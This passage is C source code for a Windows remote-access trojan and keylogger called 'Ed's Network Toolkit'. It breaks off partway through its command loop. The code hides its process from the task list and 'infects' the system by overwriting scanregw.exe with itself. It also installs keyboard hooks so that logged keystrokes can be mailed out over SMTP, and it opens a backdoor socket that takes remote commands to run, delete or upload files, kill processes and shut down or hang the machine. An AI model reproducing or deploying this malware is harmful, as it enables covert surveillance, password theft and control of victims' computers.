/*

Copyright (c) 2023, Edvardas Ges All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
    2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
    3. All advertising materials mentioning features or use of this software must display the following acknowledgement: This product includes software developed by Edvardas Ges.
    4. Neither the name of Edvardas Ges nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.

	THIS SOFTWARE IS PROVIDED BY EDVARDAS GES AS IS AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL EDVARDAS GES BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
	
*/

/*
 *	DESCRIPTION: 4 Fun and profit:
 *
 *	This program was written for remote computer administration, it is OPEN SOURCE and
 *	FREE WARE only for tiny round of people, so if you are fucker or user, don't use it,
 *	else, I'll find you anywhere and you will pay me much more you can imagine... }:-|
 *	This program is controlled by the "Telnet" program, the cause is that, that I am 
 *	working with UNIX, but wanna control users under "Windows" }:-)
 *
 *	Compilation only with Visual C++ !!!
 *
 *		Author: Edward Gess
 */

/* INCLUDES */
#include <windows.h>
#include <tlhelp32.h>

/* MACROS */
#define MAX(x, y) (x > y ? x : y)

/* VERSION INFORMATION */
/*!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*/
#define PROGRAM_MAJOR_VERSION_NUMBER 2
#define PROGRAM_MINOR_VERSION_NUMBER 2
#define PROGRAM_VERSION_STRING "\"CROSS-PLATFORM\", - CURRENT" // name of the program
#define PROGRAM_BUILD_NUMBER 70
#define PROGRAM_SOURCE_LINES_NUM 5883
/*!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*/

/*=PROGRAM CONFIGURATION=*/
/***/
#define SILENT_MODE // This flag shows in which mode the program will run
/***/

#ifndef SILENT_MODE
	#define DEBUG_MODE /* run in debug mode */
	#define ERROR_MODE /* show all errors */
#endif

#define ShowError(x) MessageBox(0, x, "Error message:", MB_ICONERROR | MB_SYSTEMMODAL)
#define ShowDebug(x) MessageBox(0, x, "Debug Message:", MB_ICONINFORMATION | MB_SYSTEMMODAL)
#define BACK_LOG 5
#define PASSWORD_WAITING_TIME 3000
/*!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*/
#define DEF_PORT 0xA000					/* !!!CHANGE_ME!!! */
#define DEF_SYNC_PORT DEF_PORT+1		/* !!!CHANGE ME!!! */
/*!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*/
#define MAX_COMMAND_LENGTH 256
#define MAX_CURRENTPATH_LENGTH 1024
#define MAX_SMTP_BUF_SIZE (128<<10)+512 // 128 kilobytes + 512 bytes
#define PROGRAM_HIDE 1
#define PROGRAM_SHOW 0
#define MAX_PASSWD_LENGTH 64 // !!!WARNING!!! before changing this look onto the "auth_client()" func. !!!
#define HALT_PROGRAM_PASSWORD "ffff"
#define SMTP_PORT 25
#define KEYLOGFILE_NAME "winkeylog.dll"
#define PROG_RESTART_TEMP_NAME "c:\\gdi32temp.exe"
#define CONFIGFILE_NAME "\\ntconfig.dll" // WARNING: must starting from back-slash
#define PROGRAM_ATOM_NAME "Ed's_Network_Toolkit"
#define HALT_PROGRAM_ATOM "I_HAVE_TO_LEAVE_MEMORY"
#define DELAY_AFTER_KILL_PROCESS 3000
#define SENDGET_FILE_BUF_SIZE 1024
#define OPERATION_SUCCESS 0
#define OPERATION_ERROR -1
#define INPUT_TOO_LONG -2
#define RESTART_PROGRAM 0
#define SHUTDOWN_PROGRAM 1
#define REFUSE_CONNECTION_DELAY 5 /* in seconds */
#define MAX_LOGSTORAGES 9
#define MAX_MAILSERVERS 99
/*!!!!!!!!!!!!!!!!!!!!<DEFAULT CONFIGURATION>!!!!!!!!!!!!!!!!!!!!!!!!*/
#define DEFAULT_PROGRAM_PASSWORD "fubar"
#define DEFAULT_LOGSTORAGE_ADDRESS "ENTER_DEFAULT_ADDRESS@FUCK.COM"
#define DEFAULT_MAILSERVER_ADDRESS "ENTER_DEFAULT_MAIL_SERVER.COM"
#define DEFAULT_NR_LOGSTORAGES 1
#define DEFAULT_NR_MAILSERVERS 1
#define DEFAULT_KEYLOGF_SEND_SIZE (1 << 10) // 32 kilobytes
#define DEFAULT_XOR_KEY 0xF0
/*!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*/
#define CONFIG_FILE_ID 0xFF00
#define ATTACHED_CONFIG_FILE_ID_0 "ATTACHED_CONFIG_FILE_ID_0"
#define ATTACHED_CONFIG_FILE_ID_1 "ATTACHED_CONFIG_FILE_ID_1"
/*=============== WINDOWS SOCKETS ================*/
#define WSA_VERSION_LOW 1
#define WSA_VERSION_HIGH 1

/*=COMMAND INDEXES=*/
#define EXECUTEFILE_COM_IND		0
#define COPYFILE_COM_IND		1
#define DELETEFILE_COM_IND		2
#define READFILE_COM_IND		3
#define WRITEFILE_COM_IND		4
#define FILESIZE_COM_IND		5
#define HELP_COM_IND			6
#define HALTPROGRAM_COM_IND		7
#define FILEMANAGER_COM_IND		8
#define QUIT_COM_IND			9
#define CADSTATUS_COM_IND		10
#define GETCOMPINFO_COM_IND		11
#define PROCESSLIST_COM_IND		12
#define KILLPROCESS_COM_IND		13
#define SMTPSENDFILE_COM_IND	14
#define FINDFILENAME_COM_IND	15
#define FINDFILESIZE_COM_IND	16
#define SHOWMESSAGE_COM_IND		17
#define HANGSYSTEM_COM_IND		18
#define MAKEDIR_COM_IND			19
#define ABOUT_COM_IND			20
#define PATHS_COM_IND			21
#define WAITDATA_COM_IND		22
#define SENDDATA_COM_IND		23
#define SHOWCONFIG_COM_IND		24
#define CODEFILE_COM_IND		25
#define MAKECONFIGFILE_COM_IND	26
#define LOADCONFIGFILE_COM_IND	27
#define LOADDEFAULTCONF_COM_IND	28
#define ENUMWIN_COM_IND			29
#define MCLICKSPEED_COM_IND		30
#define SYSPOWEROFF_COM_IND		31
#define SYSRESTART_COM_IND		32
#define MONITORCONFIG_COM_IND	33
#define KILLMOUSEBTN_COM_IND	34
#define CHANGEWALLPAPER_COM_IND	35
#define REVIVEMOUSEBTN_COM_IND	36
#define SENDSYNCCOM_COM_IND		37
#define CONFIGSYNCMSG_COM_IND	38
#define CONFIGSYNCWALLP_COM_IND	39
#define ATTACHCONFIG_COM_IND	40
#define EXTRACTCONFIG_COM_IND	41
/*
 * Here I'll define some very usable macros to avoid that annoying monotonous code.
 */
#define SEND_RESPONSE() if (send(con_s, response, lstrlen(response), 0) == SOCKET_ERROR) return
#define CHECK_ERROR_RETURN() if (res == OPERATION_ERROR) return

/* SOME KEYBOARD KEYS */
#define SHIFT_KEY		16
#define CONTROL_KEY		17
#define LMENU_KEY		91
#define RMENU_KEY		92
#define POPUPMENU_KEY	93
#define ALT_KEY			18
#define CAPSLOCK_KEY	20
#define SPACE_KEY		32
#define UP_KEY			38
#define DOWN_KEY		40
#define LEFT_KEY		37
#define RIGHT_KEY		39
#define BACKSPACE_KEY	8

#define SHIFT_UP		0x00000000
#define SHIFT_DOWN		0xFFFF8001

/* CONSTANTS FOR "get_computer_info()" FUNCTION */
#define COMP_INFO_ITEMS_CNT		7
#define INFOTYPE_USER_NAME		0
#define INFOTYPE_COMP_NAME		1
#define INFOTYPE_OS_INFO		2
#define INFOTYPE_PROC_INFO		3
#define INFOTYPE_DRIVE_INFO		4
#define INFOTYPE_MEMORY_INFO	5
#define	INFOTYPE_IP_ADDRESS		6

/* TYPES */
typedef unsigned long U_LONG;

/*=PROGRAM CONFIGURATION STUFF=*/
typedef struct {
	char *auth_password;
	char *program_version; /* when reading config file, this is never changed, a.k.a. static! */
	int nr_logstorages; /* number of storages */
	int nr_mailservers; /* number of usable (or not) mail servers */
	char **logstorages; /* list of log storages */
	char **mailservers; /* list of mail servers */
	int keylog_send_size; /* size of keylog file when it must be send */
} PROGRAM_CONFIGURATION;

typedef struct {
	int nt_header_id;
	int nr_logstorages; /* number of storages */
	int nr_mailservers; /* number of usable (or not) mail servers */
} CONFIGFILE_HEADER;

/*=PROCESSES/THREADS=*/
typedef struct {
	char *process_name;
	DWORD process_id;
} PROCESS_INFO;

typedef struct {
	char *param1;
	char *param2;
	char *param3;
	char *param4;
} THREAD_PARAM;

/* GLOBAL VARIABLES */
static BOOL WINNT_RUNNING; // indicates on what OS the program is running
static HHOOK hKeyHook = NULL; // handle of the hook procedure
static HANDLE hLogFileControlThread; // handle of the thread which controls key log file
static unsigned int MAIN_PORT_NUM = DEF_PORT;
static DWORD PAST_SHIFT_STATE = 0xF00F; // any unused value
static BOOL CAD_STATUS_HIDDEN = FALSE;
static SMTP_ERROR = 0; // no error by default
/*=BO2K=*/
static HANDLE g_hKeyCapThread=NULL;
static BOOL g_bLogging=FALSE;
static HANDLE g_hCapFile=NULL;
static DWORD g_dwKeyCapTID=0;
static HHOOK g_hLogHook=NULL;
static HWND g_hLastFocus=NULL;
static char logfilepath[MAX_PATH];
static HMODULE g_module=NULL;
/*=END!=*/
static PROGRAM_CONFIGURATION prog_conf = {
/*
 * !!!WARNING: all items (if they are pointers) must be initialized as a "NULL" pointers!!!
 */
	{ NULL },
	{ NULL },
	{ 0 },
	{ 0 },
	{ NULL },
	{ NULL },
	{ 0 }
};
/*-------------<some parameters for synchronous functions>------------------*/
/*---<Synchronous message>---*/
static char SYNC_MESSAGE_TEXT[MAX_COMMAND_LENGTH];
static char SYNC_MESSAGE_TITLE[MAX_COMMAND_LENGTH];
static char SYNC_MESSAGE_TYPE[MAX_COMMAND_LENGTH];
/*---<Synchronous change desktop wallpaper>---*/
static char SYNC_CHANGEWALLPAPER_FILENAME[MAX_COMMAND_LENGTH];
/*--------------------------------------------------------------------------*/

static BOOL CAPSLOCK_ENABLED = FALSE; /* is the Caps Lock key enabled ? */
static BOOL SHIFT_ENABLED = FALSE;
static HWND hOldWindow = NULL;

const int NUM_COMMANDS = 42; /* must be global, will be used in loops, etc. */
static char PROG_COMMANDS[NUM_COMMANDS][MAX_COMMAND_LENGTH] = {
		{"executefile"},	/* index = 0 */
		{"copyfile"},		/* index = 1 */
		{"deletefile"},		/* index = 2 */
		{"readfile"},		/* index = 3 */
		{"writefile"},		/* index = 4 */
		{"filesize"},		/* index = 5 */
		{"help"},			/* index = 6 */
		{"haltprogram"},	/* index = 7 */
		{"filemanager"},	/* index = 8 */
		{"quit"},			/* index = 9 */
		{"cadstatus"},		/* index = 10 */
		{"getcompinfo"},	/* index = 11 */
		{"processlist"},	/* index = 12 */
		{"killprocess"},	/* index = 13 */
		{"smtpsendfile"},	/* index = 14 */
		{"findfilename"},	/* index = 15 */
		{"findfilesize"},	/* index = 16 */
		{"showmessage"},	/* index = 17 - SYNC */
		{"hangsystem"},		/* index = 18 - SYNC */
		{"makedir"},		/* index = 19 */
		{"about"},			/* index = 20 */
		{"paths"},			/* index = 21 */
		{"waitdata"},		/* index = 22 */
		{"senddata"},		/* index = 23 */
		{"showconfig"},		/* index = 24 */
		{"codefile"},		/* index = 25 */
		{"makeconfigfile"},	/* index = 26 */
		{"loadconfigfile"},	/* index = 27 */
		{"loaddefaultconf"},/* index = 28 */
		{"enumwin"},		/* index = 29 */
		{"mclickspeed"},	/* index = 30 */
		{"syspoweroff"},	/* index = 31 - SYNC */
		{"sysrestart"},		/* index = 32 - SYNC */
		{"monitorconfig"},	/* index = 33 */
		{"killmousebtn"},	/* index = 34 - SYNC */
		{"changewallpaper"},/* index = 35 - SYNC */
		{"revivemousebtn"},	/* index = 36 - SYNC */
		{"sendsynccom"},	/* index = 37 */
		{"configsyncmsg"},	/* index = 38 */
		{"configsyncwallp"},/* index = 39 */
		{"attachconfig"},	/* index = 40 */
		{"extractconfig"}	/* index = 41 */
};

static HANDLE hLogFileSenderThread = NULL;

/* FUNCTION PROTOTYPES (system functions) */
int		init_server_socket				( void );
void	connection_handler				( void );
void	process_commands				( int );
void	execute_command					( int, char * );
int		get_com_param					( int, char *, char *, int, BOOL );
void	do_spread						( void );
void	program_cad_state				( int );
int		auth_client						( int );
void	CALLBACK waiting_func			( HWND, UINT, UINT, DWORD );
int		get_s_data						( int, char *, int );
int		send_s_data						( int, char *, int );
void 	smtp_send_message				( int, char *, char *, char *, char *, char * );
int		smtp_send_file					( char *, char * );
int		connect_to_server				( int, char * );
int		halt_program					( char *, int );
void	show_about						( int );
int		code_file						( char *, byte );
void	read_config_file				( void );
void	write_config_file				( char *, int, int, int, char **, char ** );
void	set_default_config				( void );
void	get_winnt_shutdown_privileges	( void );
void	is_winnt_running				( BOOL * );
void	make_program_autorun			( void );
DWORD	WINAPI mpa_thread				( LPVOID );
void	start_mpa_thread				( void );
void	attach_config_file				( void );
void	extract_config_file				( void );
DWORD	WINAPI halt_thread				( LPVOID );
void	start_halt_thread				( void );
void	send_welcome_message			( int );

/* TINY LIBRARY */
char	lower_to_upper					( char );
char	upper_to_lower					( char );
void	upper_case						( char * );
void	lower_case						( char * );
int		str_pos							( char *, char );
int		execute_file					( char *, char * );
int		file_exists						( char * );
int		copy_file						( char *, char * );
int		copy_files						( int, char *, char *, BOOL );
int		remove_file						( char * );
int		remove_files					( int, char *, BOOL );
HANDLE	create_file						( char * );
HANDLE	open_file						( char * );
int		append_file						( char *, char *, U_LONG );
int		write_file						( char *, char *, U_LONG );
int		read_file						( char *, char *, U_LONG );
int		create_dir						( char * );
int		remove_dir						( char * );
PROCESS_INFO *get_processes				( DWORD * );
int		kill_process					( char * );
int		get_process_id					( char *, DWORD * );
void	get_computer_info				( int, char * );
int		get_file_size					( char *, DWORD * );
void	run_file_manager				( int ); /* console file manager */
int		get_user_name					( char * );
void	extract_file_path				( char *, char * );
void	extract_file_name				( char *, char * );
void	findfile_by_name				( int, char *, char * );
void	findfile_by_size				( int, char *, DWORD, DWORD );
DWORD	WINAPI message_box_thread		( LPVOID );
void	display_message_box				( char *, char *, int );
void	get_weekdayname_by_num			( int, char * );
void	enum_windows					( int );
BOOL	CALLBACK EnumWindowsProc		( HWND, LPARAM );
void	hang_system						( void );
void	command_robot					( int, char * );
void	set_default_sync_func_params	( void );
/*---<UPLOAD/DOWNLOAD>---*/
DWORD	WINAPI send_file_data_thread	( LPVOID ); /* single thread */
DWORD	WINAPI get_file_data_thread		( LPVOID ); /* single thread */
static	void get_file_data				( char *, int, int );
static 	void send_file_data				( char *, char *, int, int );
/* key hook's stuff */
void	start_logfile_control_thread	( void );
void	kill_logfile_control_thread		( void );
DWORD	WINAPI logfile_control_thread	( LPVOID );
void	kill_key_hook					( void );
void	run_key_hook					( void );
/*=OLD KEYBOARD HANDLER=*/
LRESULT	CALLBACK KeyboardProc			( int, WPARAM, LPARAM );
/* sync functions */
void	start_sync_function_thread		( void );
DWORD	WINAPI sync_function_thread		( LPVOID );
void	send_sync_command				( char *, char *, char *, char *, unsigned long );
void	run_sync_command				( char * );
void	inc_ip_address					( char * );
/*=BO2K=*/
DWORD	WINAPI KeyCapThread				( LPVOID );
LRESULT CALLBACK JournalLogProc			( int, WPARAM, LPARAM );
DWORD	get_ip_by_name					( char * );

/*
 *	PROGRAM ENTRY POINT
 */
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	g_module = GetModuleHandle(NULL);

	is_winnt_running(&WINNT_RUNNING); /* set the flag */
#ifdef DEBUG_MODE
	if (WINNT_RUNNING)
		ShowDebug("Network toolkit is running on Windows NT");
	else
		ShowDebug("Network toolkit is running on Windows 95/98");
#endif

	program_cad_state(PROGRAM_HIDE);
	do_spread(); // I gonna keep myself on the system
	start_halt_thread();
	prog_conf.program_version = (char *)malloc(64 + lstrlen(PROGRAM_VERSION_STRING)); // WARNING: must be < MAX_COMMAND_LENGTH!!!
	if (prog_conf.program_version!=NULL) {
		wsprintf(
			prog_conf.program_version,
			"[%lu.%lu.%lu-%s]",
			PROGRAM_MAJOR_VERSION_NUMBER,
			PROGRAM_MINOR_VERSION_NUMBER,
			PROGRAM_BUILD_NUMBER,
			PROGRAM_VERSION_STRING
		);
	} else { // shit, error allocating the memory!
		#ifdef ERROR_MODE
			ShowError("malloc() in WinMain()");
		#endif
	}
	extract_config_file();
	read_config_file(); // set/modify default program options
	start_logfile_control_thread(); // start the key logger engine!!!
	//set_default_sync_func_params();
	//start_sync_function_thread(); // run the hidden service
	connection_handler(); // run the main command socket

	return (0);
}

/*
 *	show_about() - This function writes an information about the program to
 *			   the given socket.
 */
void show_about(int con_s)
{
#define SEND_BUF() if (send(con_s, buf, lstrlen(buf), 0) == SOCKET_ERROR) return

	char *buf;

	if ((buf = (char *)malloc(512)) == NULL)
		return;
	wsprintf(buf, "+---------------------------<ABOUT>---------------------------+\r\n");
	SEND_BUF();
	wsprintf(buf, "| Program version: [%s]\r\n", prog_conf.program_version);
	SEND_BUF();
	wsprintf(buf, "| Author: [Macrolosa]\r\n");
	SEND_BUF();
	wsprintf(buf, "| Number of commands: [%d]\r\n", NUM_COMMANDS);
	SEND_BUF();
	wsprintf(buf, "| Number of source code lines: [%lu]\r\n", PROGRAM_SOURCE_LINES_NUM);
	SEND_BUF();
	wsprintf(buf, "+-------------------------------------------------------------+\r\n");
	SEND_BUF();

	free(buf);
}

/*
 *	halt_program - terminates or restarts the program if the password is valid.
 */
int halt_program(char *passwd, int code)
{
	HMODULE hProgram;
	char *exe_name;

	if (lstrcmp(passwd, HALT_PROGRAM_PASSWORD)!=0)
		return (OPERATION_ERROR); /* if the password is incorrect ... */
	if ((exe_name = (char *)malloc(MAX_PATH + 0xF))==NULL)
		return (OPERATION_ERROR);
	switch (code) {
		case RESTART_PROGRAM:
			kill_logfile_control_thread(); /* shut down the keyboard hook */
			hProgram = GetModuleHandle(NULL); /* get handle of the current module */
			GetModuleFileName(hProgram,exe_name,MAX_PATH);
			remove_file(PROG_RESTART_TEMP_NAME);
			copy_file(exe_name,PROG_RESTART_TEMP_NAME);
			execute_file(PROG_RESTART_TEMP_NAME,NULL);
			free(exe_name);
			ExitProcess(0); /* halt the program */
			break; /* not reached */
		case SHUTDOWN_PROGRAM:
			kill_logfile_control_thread();
			GlobalDeleteAtom(GlobalFindAtom(PROGRAM_ATOM_NAME));
			free(exe_name);
			ExitProcess(0); /* HALT THE PROGRAM */
			break;
		default:
			free(exe_name);
			return (OPERATION_ERROR);
	}
	// never reached
}

/*
 *	program_cad_state() - this function registers/unregisters current process as the
 *				    service process. If process was ran as the service process,
 *				    it exists even user logs off, so all login passwords will
 *				    be mine! Also this function hides program name from
 *				    CTRL+ALT+DEL dialog.
 */
void program_cad_state(int hidden)
{
#define RSP_SIMPLE_SERVICE 1
#define RSP_UNREGISTER_SERVICE 0

typedef DWORD (WINAPI *REGISTER_SERVICE_PROCESS) (DWORD, DWORD);

	HMODULE hKernel32;	
	REGISTER_SERVICE_PROCESS pRegisterServiceProcess;

	if ((hKernel32 = LoadLibrary("kernel32.dll"))==NULL) {
		#ifdef ERROR_MODE
			ShowError("process_cad_state(): Error loading library!");
		#endif
		return; /* can not continue */
	}
	if (!WINNT_RUNNING) {
		pRegisterServiceProcess = (REGISTER_SERVICE_PROCESS)GetProcAddress(hKernel32, "RegisterServiceProcess");
		if (pRegisterServiceProcess!=NULL) { /* was the function found ? */
			/* yes, it was, so hide the process under Windows 95/98 */
			if (hidden) { /* hide process */
				(void)pRegisterServiceProcess((DWORD)0,(DWORD)RSP_SIMPLE_SERVICE);
				CAD_STATUS_HIDDEN = TRUE;
#ifdef DEBUG_MODE
					ShowDebug("I am hidden!");
#endif
			} else {
				(void)pRegisterServiceProcess((DWORD)0,(DWORD)RSP_UNREGISTER_SERVICE);
				CAD_STATUS_HIDDEN = FALSE;
#ifdef DEBUG_MODE
					ShowDebug("I am visible!");
#endif
			}
		} else {
#ifdef ERROR_MODE
			ShowError("Unable to find \"RegisterServiceProcess\" function in kernel32.dll");
#endif
		}
	} else { // The program is running under Windows NT
		/*=Windows NT code=*/
	}
	FreeLibrary(hKernel32);
}

/*
 *	do_spread() - initialize the program on the system, i.e. "infect" the
 *                system by this program. In a word this function checks is
 *                the program running from c:\<windir>\scanregw.exe if no, then
 *                it will removes the real "scanregw.exe" and copies itself
 *                there. I think this method is rather than doing an entry into
 *                windows registry, because every fucking user knows about it
 *                and can destroy this program easy.
 */
void do_spread(void)
{
	char *program_exe_name = NULL;
	char *dead_file = NULL;
	char *c_l; // command line
	HMODULE hProgram;

	program_exe_name = (char *)malloc(MAX_PATH);
	dead_file = (char *)malloc(MAX_PATH);
	if (
		program_exe_name == NULL ||
		dead_file == NULL
	) { /*=I'll halt on nay error=*/
		#ifdef ERROR_MODE
			ShowError("malloc() in do_spread()");
		#endif
		/*=I don't know where the error is, so free all of them=*/
		free(program_exe_name);
		free(dead_file);
		return;
	}
	GetWindowsDirectory(dead_file,MAX_PATH);
	lstrcpy(dead_file + lstrlen(dead_file),"\\scanregw.exe");
	hProgram = GetModuleHandle(NULL); // get handle of myself
	GetModuleFileName(hProgram,program_exe_name,MAX_PATH); // get my exe name
	if (lstrcmpi(program_exe_name,dead_file)!=0) { // is the comp ready "infected"?
		/*=no, it is not, so "infect" it...=*/
		#ifdef DEBUG_MODE
			ShowDebug("Infecting system...");
		#endif

		/*
		 * Now I should remove the atom, because I'll execute the program from it's
		 * "home" place and it will think that it shouldn't run if it finds this atom!
		 */
		GlobalDeleteAtom(GlobalFindAtom(PROGRAM_ATOM_NAME));

		/*
		 * Because of that the comp may be ready "infected" and this function may be
		 * called by the fake "scanregw.exe" for restarting. So I need to wait a bit
		 * while that copy of this program finishes it's work...
		 */
		SleepEx(500, FALSE);

		/*
		 * Now I can remove it...
		 */
		GlobalAddAtom(HALT_PROGRAM_ATOM); // After this my program halts if it is running
		Sleep(3000);
		remove_file(dead_file);
		CopyFile(program_exe_name, dead_file, FALSE); // copy myself there, in a word make a fake of the original "scanregw.exe"
		/*
		 * Now I have to execute my copy (fake) and tell it that it must remove me...
		 */
		execute_file(dead_file,program_exe_name);
		free(program_exe_name);
		free(dead_file);
		ExitProcess(0); /* HALT */
	} else {
		/*
		 * If the computer is ready "infected" by the program and
		 * these code lines are executed from the "c:\<windir>\scanregw.exe",
		 * then notice me about it...
		 */
#ifdef DEBUG_MODE
		ShowDebug("Ed's Network Toolkit is running from it's home dir!");
#endif
		/*=Get the name of file to be removed=*/
		c_l = GetCommandLine();
		while (*++c_l!=0x00)
			if (*c_l=='"')
				break;
		if (*c_l=='"') { // do I need to remove something?
			c_l+=2; // skip '"' and space (get to the first byte of file name to be deleted)
			/*=yes I do=*/
			Sleep(1000);
			remove_file(c_l); // bye...
#ifdef DEBUG_MODE
				ShowDebug(c_l);
#endif
		}
		if (GlobalFindAtom(PROGRAM_ATOM_NAME)) {
#ifdef ERROR_MODE
				ShowError("The program is already running! Halting...");
#endif
			free(program_exe_name);
			free(dead_file);
			ExitProcess(0); /* the copy of my program is already running, so halt... */
		}
#ifdef DEBUG_MODE
			ShowDebug("Doing registry entries...");
#endif
		start_mpa_thread();
		GlobalAddAtom(PROGRAM_ATOM_NAME); /* I am running! */
	}
	free(program_exe_name);
	free(dead_file);
}

/*
 *	init_server_socket() - returns ready-to-use server socket or OPERATION_ERROR
 *				     on error.
 */
int init_server_socket(void)
{
	int s1; /* socket */
	struct sockaddr_in local_addr;
	WSADATA wsaData;

	if (WSAStartup(MAKEWORD(WSA_VERSION_HIGH,WSA_VERSION_LOW),&wsaData) != OPERATION_SUCCESS) {
		#ifdef ERROR_MODE
			ShowError("WSAStartup()");
		#endif
		return (OPERATION_ERROR);
	}

	if ((s1 = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		#ifdef ERROR_MODE
			ShowError("socket()");
		#endif
		return (OPERATION_ERROR);
	}

	ZeroMemory(&local_addr, sizeof(struct sockaddr_in)); /* fill whole struct by zeroes */
	local_addr.sin_port = htons(MAIN_PORT_NUM);
	local_addr.sin_addr.s_addr = INADDR_ANY;
	local_addr.sin_family = AF_INET;

	if (bind(s1, (struct sockaddr *)&local_addr, sizeof(struct sockaddr)) == SOCKET_ERROR) {
		#ifdef ERROR_MODE
			ShowError("bind() in init_server_socket()");
		#endif
		return (OPERATION_ERROR);
	}

	if (listen(s1, BACK_LOG) == SOCKET_ERROR) {
		#ifdef ERROR_MODE
			ShowError("listen()");
		#endif
		return (OPERATION_ERROR);
	}

	return (s1); /* if no errors, return socket */
}

/*
 *	connection_handler() - the name is describing all, but for more information
 *				     I can say that this function waits for connection and
 *			           when it gets it, then it calls to "process_commands"
 *			           as argument giving handle of the connected socket...
 */
void connection_handler(void)
{
	int sin_size, in_s, m_socket;
	struct sockaddr_in incoming_con;

	if ((m_socket = init_server_socket()) == OPERATION_ERROR) {
		#ifdef ERROR_MODE
			ShowError("init_server_socket() in connection_handler()");
		#endif
		ExitProcess(0); /* can't continue... */
	}

	while (TRUE) {
		sin_size = sizeof(struct sockaddr_in);
		if ((in_s = accept(m_socket, (struct sockaddr *)&incoming_con, &sin_size)) == INVALID_SOCKET) {
			#ifdef ERROR_MODE
				ShowError("accept() in connection_handler()");
			#endif
			continue; /* that error is not a cause for quiting */
		}
		if (auth_client(in_s)) {
			send_welcome_message(in_s);
			process_commands(in_s);
		} else
			closesocket(in_s);
	}
}

/*
 *	auth_client() - authorize a client if it sends a valid password. I did this
 *			    feature to protect this program from some fuckers...
 *
 *	retruns 1 on OK, else returns 0
 */
int auth_client(int con_s)
{
	char buf[MAX_PASSWD_LENGTH];
	int res;
	struct timeval tv;
	fd_set r_fd;
	int s_r; /* select result */

	FD_ZERO(&r_fd);
	FD_SET(con_s,&r_fd);
	tv.tv_sec=REFUSE_CONNECTION_DELAY;
	tv.tv_usec=0x0;
	wsprintf(buf, "\r\nEnter password: ");
	if (send(con_s, buf, lstrlen(buf), 0) == SOCKET_ERROR)
		return (0); /* if error sending then return error */
	s_r=select(0x0,&r_fd,NULL,NULL,&tv);
	if (!s_r) {
		wsprintf(buf,"\r\nConnection refused!\r\n");
		send(con_s,buf,lstrlen(buf),0x0);
		return 0x0; /* error */
	}
	if (s_r==SOCKET_ERROR)
		return 0x0;
	res = get_s_data(con_s, buf, sizeof(buf));
	if (res) {
		if (lstrcmp(buf, prog_conf.auth_password)) {
			goto ___bad_password;
		} else {
			wsprintf(buf, "\r\nPassword OK.\r\n\r\n");
			if (send(con_s, buf, lstrlen(buf), 0) == SOCKET_ERROR)
				return (0);
			Sleep(1000);
			return (1);
		}
	} else {
___bad_password:
		wsprintf(buf, "\r\nBad password!");
		if (send(con_s, buf, lstrlen(buf), 0) == SOCKET_ERROR)
			return (0);
		Sleep(1000);
		return (0);
	}
}

/*
 *	send_s_data - sends data to the given socket by one char. Like Telnet? Yes.
 */
int send_s_data(int con_s, char *buf, int m_length)
{
	int i;
	char c;

	for (i = 0; i < m_length; i++) {
		c = buf[i];
		if (send(con_s, &c, 1, 0) == SOCKET_ERROR)
			return (0); /* if can't send then return... zero... */
	}
	return (i+1);
}

/*
 *	get_s_data() - receives chars from the given socket and stores them in to the
 *			   "buf". This function receives only (<= "m_length") number of chars.
 *			   If number of passed chars is bigger than "m_length" it will
 *			   returns zero. This feature is done here to handle buffer over-
 *			   flows and to be compatible with Telnet protocol.
 */
int get_s_data(int con_s, char *buf, int m_length)
{
	char *p_com, com;
	int res, total_rec;

	p_com = buf;
	total_rec = 0; /* NOTE: total_rec must be zero on this function call! */
	do {
		if ((res = recv(con_s, &com, 1, 0)) == SOCKET_ERROR)
			return (OPERATION_ERROR);
		if (com == '\r') { /* if Enter key was presses, so first I'll get 0x0D then 0x0A */
			*p_com = '\0'; /* make a valid end of the received string, */
				       /* or do nothing if no chars was received, */
				       /* except 0x0D... */
			return (total_rec); /* return number of chars received (without last zero!), */
					    /* or zero if received only 0x0D (I don't need 0x0D) */
		}
		if ((res) && (res != (OPERATION_ERROR)) && (com != ('\n'))) {
		/* if client is alive, no errors and com != 0x0A, continue... */
			if (total_rec < m_length) { /* will received data holds in buf ? */
				*p_com = com; /* yes... */
				p_com++;
				total_rec++;
			} else { return (INPUT_TOO_LONG); /* No! - protect myself from buffer-overflow */ }
		} /* do nothing else */
	} while ((res) && (res != (OPERATION_ERROR)));
	return (res);
}

/*
 *	process_commands() - this is a command processor, it gets commands from the
 *				   given socket and attempts to execute them calling the
 *				   "execute_command" function...
 */
void process_commands(int con_s)
{
	char command_buf[MAX_COMMAND_LENGTH];
	int res;

	ZeroMemory(command_buf, sizeof(command_buf));
	do {
		if (send(con_s, "\r\nEnter command: ", 17, 0) == SOCKET_ERROR)
			return;
